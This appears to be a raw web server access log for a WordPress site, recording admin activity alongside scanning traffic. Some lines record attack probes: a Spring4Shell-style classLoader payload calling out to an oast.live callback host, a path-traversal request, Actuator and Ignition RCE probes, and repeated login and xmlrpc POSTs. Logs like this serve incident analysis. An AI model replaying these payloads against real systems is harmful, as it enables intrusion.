193.118.53.210 - - [31/Oct/2022:21:58:29 +0000] "GET / HTTP/1.1" 200 13689 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:21:59:23 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:22:01:23 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:22:03:23 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
222.252.64.187 - - [31/Oct/2022:22:04:34 +0000] "GET /threaddump HTTP/1.1" 404 4172 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
222.252.64.187 - - [31/Oct/2022:22:04:35 +0000] "GET /actuator/threaddump HTTP/1.1" 404 4172 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36"
222.252.64.187 - - [31/Oct/2022:22:04:35 +0000] "POST / HTTP/1.1" 200 14111 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F"
222.252.64.187 - - [31/Oct/2022:22:04:36 +0000] "GET /?class.module.classLoader.resources.context.configFile=http://cdg3ghd4l5nro20ncif0zng18zbdmwdzc.oast.live&class.module.classLoader.resources.context.configFile.content.aaa=xxx HTTP/1.1" 200 14111 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36"
222.252.64.187 - - [31/Oct/2022:22:04:37 +0000] "POST / HTTP/1.1" 200 14111 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36"
222.252.64.187 - - [31/Oct/2022:22:04:38 +0000] "GET /?class.module.classLoader.resources.context.configFile=https://cdg3ghd4l5nro20ncif0xzcg41mdx1ixe.oast.live&class.module.classLoader.resources.context.configFile.content.aaa=xxx HTTP/1.1" 200 14111 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
222.252.64.187 - - [31/Oct/2022:22:04:38 +0000] "POST /actuator/env HTTP/1.1" 404 4172 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36"
222.252.64.187 - - [31/Oct/2022:22:04:39 +0000] "GET /photo/combine.php?type=javascript&g=core-r7rules/../../../hello.php. HTTP/1.1" 404 4172 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:22:05:24 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:22:07:25 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
45.61.187.99 - - [31/Oct/2022:22:08:08 +0000] "GET /wp-login.php HTTP/1.1" 200 11285 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:30.0) Gecko/20100101 Firefox/30.0"
80.62.117.254 - - [31/Oct/2022:22:09:26 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
45.61.187.99 - - [31/Oct/2022:22:09:27 +0000] "POST /wp-login.php HTTP/1.1" 200 11764 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:30.0) Gecko/20100101 Firefox/30.0"
107.189.6.184 - - [31/Oct/2022:22:10:01 +0000] "GET /wp-login.php HTTP/1.1" 200 11285 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
209.141.49.253 - - [31/Oct/2022:22:11:17 +0000] "GET /wp-login.php HTTP/1.1" 200 11285 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/6.1.5 Safari/537.77.4"
107.189.6.184 - - [31/Oct/2022:22:11:24 +0000] "POST /wp-login.php HTTP/1.1" 200 11761 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:22:11:27 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
209.141.49.253 - - [31/Oct/2022:22:12:47 +0000] "POST /wp-login.php HTTP/1.1" 200 11760 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/6.1.5 Safari/537.77.4"
80.62.117.254 - - [31/Oct/2022:22:13:28 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
205.185.117.143 - - [31/Oct/2022:22:15:18 +0000] "GET /wp-login.php HTTP/1.1" 200 11285 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
205.185.117.143 - - [31/Oct/2022:22:15:18 +0000] "POST /wp-login.php HTTP/1.1" 200 8595 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
80.62.117.254 - - [31/Oct/2022:22:15:29 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:22:17:30 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:22:19:31 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
45.61.188.188 - - [31/Oct/2022:22:20:33 +0000] "GET /wp-login.php HTTP/1.1" 200 11285 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
45.61.188.188 - - [31/Oct/2022:22:20:33 +0000] "POST /wp-login.php HTTP/1.1" 200 8595 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:22:21:32 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:22:23:32 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:22:25:32 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:22:27:33 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:22:29:34 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:22:31:35 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
152.89.196.211 - - [31/Oct/2022:22:31:44 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 4172 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:22:33:35 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
107.189.6.184 - - [31/Oct/2022:22:34:44 +0000] "GET /wp-login.php HTTP/1.1" 200 11285 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0"
80.62.117.254 - - [31/Oct/2022:22:35:36 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
107.189.6.184 - - [31/Oct/2022:22:36:17 +0000] "POST /wp-login.php HTTP/1.1" 200 11763 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0"
45.61.184.58 - - [31/Oct/2022:22:36:57 +0000] "GET /wp-login.php HTTP/1.1" 200 11285 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:31.0) Gecko/20100101 Firefox/31.0"
45.61.184.58 - - [31/Oct/2022:22:37:01 +0000] "POST /wp-login.php HTTP/1.1" 200 8599 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:31.0) Gecko/20100101 Firefox/31.0"
103.110.84.132 - - [31/Oct/2022:22:37:31 +0000] "POST /xmlrpc.php HTTP/1.1" 200 3572 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96"
80.62.117.254 - - [31/Oct/2022:22:37:37 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
46.101.144.32 - - [31/Oct/2022:22:39:37 +0000] "POST /wp-cron.php?doing_wp_cron=1667255977.5323190689086914062500 HTTP/1.1" 200 3977 "https://talmedos.com/wp-cron.php?doing_wp_cron=1667255977.5323190689086914062500" "WordPress/6.0.3; https://talmedos.com"
80.62.117.254 - - [31/Oct/2022:22:39:37 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:22:41:38 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:22:43:38 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:22:45:39 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
107.189.3.40 - - [31/Oct/2022:22:47:28 +0000] "GET /wp-login.php HTTP/1.1" 200 11285 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) GSA/4.1.0.31802 Mobile/11D257 Safari/9537.53"
80.62.117.254 - - [31/Oct/2022:22:47:39 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
107.189.3.40 - - [31/Oct/2022:22:49:05 +0000] "POST /wp-login.php HTTP/1.1" 200 11761 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) GSA/4.1.0.31802 Mobile/11D257 Safari/9537.53"
80.62.117.254 - - [31/Oct/2022:22:49:40 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:22:51:41 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
104.244.77.229 - - [31/Oct/2022:22:51:44 +0000] "GET /wp-login.php HTTP/1.1" 200 11285 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
104.244.77.229 - - [31/Oct/2022:22:51:44 +0000] "POST /wp-login.php HTTP/1.1" 200 8599 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
152.89.196.211 - - [31/Oct/2022:22:52:21 +0000] "GET /_ignition/execute-solution HTTP/1.1" 404 4172 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:22:53:42 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
45.125.239.179 - - [31/Oct/2022:22:55:07 +0000] "POST /xmlrpc.php HTTP/1.1" 200 3588 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96"
80.62.117.254 - - [31/Oct/2022:22:55:43 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:22:56:03 +0000] "-" 408 3741 "-" "-"
80.62.117.254 - - [31/Oct/2022:22:57:44 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:22:59:45 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:23:01:47 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
209.141.37.194 - - [31/Oct/2022:23:03:03 +0000] "GET /wp-login.php HTTP/1.1" 200 11285 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14"
209.141.37.194 - - [31/Oct/2022:23:03:04 +0000] "POST /wp-login.php HTTP/1.1" 200 8594 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14"
80.62.117.254 - - [31/Oct/2022:23:03:48 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:23:05:49 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
157.55.39.195 - - [31/Oct/2022:23:05:56 +0000] "GET / HTTP/1.1" 200 14324 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
80.62.117.254 - - [31/Oct/2022:23:07:50 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:23:09:51 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.146.82.142 - - [31/Oct/2022:23:10:08 +0000] "HEAD / HTTP/1.1" 200 3564 "-" "Opera/3.0 (Macintosh 4.1; rv:2.0.1) Gecko/20100101 Firefox/3.0.4"
217.146.82.142 - - [31/Oct/2022:23:10:09 +0000] "GET / HTTP/1.1" 200 58711 "-" "Opera/3.0 (Macintosh 4.1; rv:2.0.1) Gecko/20100101 Firefox/3.0.4"
80.62.117.254 - - [31/Oct/2022:23:11:54 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
107.180.107.103 - - [31/Oct/2022:23:12:06 +0000] "POST /xmlrpc.php HTTP/1.1" 200 3588 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96"
80.62.117.254 - - [31/Oct/2022:23:14:00 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
209.141.47.94 - - [31/Oct/2022:23:15:51 +0000] "GET /wp-login.php HTTP/1.1" 200 11285 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:23:16:01 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
107.189.13.99 - - [31/Oct/2022:23:16:51 +0000] "GET /wp-login.php HTTP/1.1" 200 11285 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:31.0) Gecko/20100101 Firefox/31.0"
209.141.47.94 - - [31/Oct/2022:23:17:07 +0000] "POST /wp-login.php HTTP/1.1" 200 11760 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:23:18:02 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
107.189.13.99 - - [31/Oct/2022:23:18:22 +0000] "POST /wp-login.php HTTP/1.1" 200 11760 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:31.0) Gecko/20100101 Firefox/31.0"
154.89.5.110 - - [31/Oct/2022:23:18:56 +0000] "GET / HTTP/1.0" 301 3957 "-" "-"
80.62.117.254 - - [31/Oct/2022:23:20:05 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:23:22:08 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
45.61.184.58 - - [31/Oct/2022:23:23:05 +0000] "GET /wp-login.php HTTP/1.1" 200 11285 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/34.0.1847.116 Chrome/34.0.1847.116 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:23:24:09 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
45.61.184.58 - - [31/Oct/2022:23:24:29 +0000] "POST /wp-login.php HTTP/1.1" 200 11764 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/34.0.1847.116 Chrome/34.0.1847.116 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:23:26:09 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
152.89.196.211 - - [31/Oct/2022:23:27:30 +0000] "GET / HTTP/1.1" 301 3957 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [31/Oct/2022:23:27:30 +0000] "GET / HTTP/1.1" 200 14111 "https://46.101.144.32:443/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:23:28:09 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
184.168.121.5 - - [31/Oct/2022:23:29:23 +0000] "POST /xmlrpc.php HTTP/1.1" 200 3588 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96"
80.62.117.254 - - [31/Oct/2022:23:30:10 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
209.141.57.9 - - [31/Oct/2022:23:30:20 +0000] "GET /wp-login.php HTTP/1.1" 200 11285 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:30.0) Gecko/20100101 Firefox/30.0"
209.141.57.9 - - [31/Oct/2022:23:30:20 +0000] "POST /wp-login.php HTTP/1.1" 200 8594 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:30.0) Gecko/20100101 Firefox/30.0"
80.62.117.254 - - [31/Oct/2022:23:32:10 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
80.62.117.254 - - [31/Oct/2022:23:34:10 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 1110 "https://talmedos.com/wp-admin/themes.php?page=simple-custom-css.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
